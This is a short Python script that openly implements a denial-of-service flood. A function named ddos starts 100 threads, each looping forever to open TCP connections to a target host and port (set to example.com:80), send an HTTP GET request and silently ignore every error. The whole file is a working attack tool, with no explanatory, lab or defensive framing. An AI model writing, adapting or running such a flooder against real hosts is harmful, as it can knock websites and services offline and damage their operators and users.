import socket
import time
import random
import threading

def ddos(target, port, num_threads):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass

    for _ in range(num_threads):
        threading.Thread(target=attack).start()

if __name__ == "__main__":
    target = "example.com"
    port = 80
    num_threads = 100
    ddos(target, port, num_threads)